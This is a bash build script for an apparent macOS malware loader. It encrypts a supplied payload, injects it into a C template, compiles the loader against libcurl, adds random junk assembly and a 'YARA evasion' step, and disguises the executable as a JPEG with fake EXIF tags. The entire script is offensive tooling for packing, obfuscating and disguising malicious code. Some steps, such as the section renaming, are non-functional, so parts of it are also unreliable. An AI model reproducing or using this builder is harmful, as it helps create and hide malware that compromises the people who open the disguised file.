#!/bin/bash
set -e

if [ $# -lt 5 ]; then
    echo "Usage: $0 <image.jpg> <payload.bin> <base_key> <salt> <iv>"
    exit 1
fi

IMAGE="$1"
PAYLOAD="$2"
BASE_KEY="$3"
SALT="$4"
IV="$5"
OUTPUT="quantum_loader_mac"
TEMP_C="temp.c"

# Generate junk.h
echo "[*] Generating junk.h..."
instructions=("nop" "mov %eax, %eax" "push %rax; pop %rax")
count=$((RANDOM % 5 + 1))
asm=""
for ((i=0; i<count; i++)); do
    idx=$((RANDOM % ${#instructions[@]}))
    asm+="${instructions[idx]}; "
done
echo "#define JUNK_ASM asm volatile (\"$asm\")" > junk.h

# Encrypt payload
echo "[*] Encrypting payload..."
DERIVED_KEY=$(openssl hkdf -binary -md sha256 -keylen 32 -salt "$SALT" -inkey "$BASE_KEY")
openssl enc -aes-256-cbc -in "$PAYLOAD" -out payload.enc -K "$DERIVED_KEY" -iv "$IV" -nopad

# Convert to hex
ENC_PAYLOAD=$(xxd -p payload.enc | tr -d '\n' | sed 's/../\\x&/g')
SALT_HEX=$(echo -n "$SALT" | xxd -p | tr -d '\n' | sed 's/../\\x&/g')
IV_HEX=$(echo -n "$IV" | xxd -p | tr -d '\n' | sed 's/../\\x&/g')
BASE_KEY_HEX=$(echo -n "$BASE_KEY" | xxd -p | tr -d '\n' | sed 's/../\\x&/g')

# Inject into C template
echo "[*] Generating C code..."
sed "s|__ENCRYPTED_PAYLOAD__|$ENC_PAYLOAD|" quantum_loader_mac.c \
    | sed "s|__FIXED_SALT__|$SALT_HEX|" \
    | sed "s|__IV__|$IV_HEX|" \
    | sed "s|__BASE_KEY__|$BASE_KEY_HEX|" > "$TEMP_C"

# Compile
echo "[*] Compiling..."
clang -Os -o "$OUTPUT" "$TEMP_C" -lcurl
strip "$OUTPUT"

# YARA evasion: Rename sections (basic approach)
RANDOM_TEXT=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
otool -l "$OUTPUT" > /dev/null # Ensure compatibility; advanced renaming needs custom tools

# Create JPEG polyglot
echo -ne '\xff\xd8\xff\xe0' > "$IMAGE"
cat "$OUTPUT" >> "$IMAGE"
exiftool -overwrite_original -Model="QuantumMac" -Artist="Invisible" "$IMAGE" > /dev/null 2>&1
chmod +x "$IMAGE"

echo "[✓] Payload complete: $IMAGE"
rm -f "$TEMP_C" payload.enc junk.h "$OUTPUT"
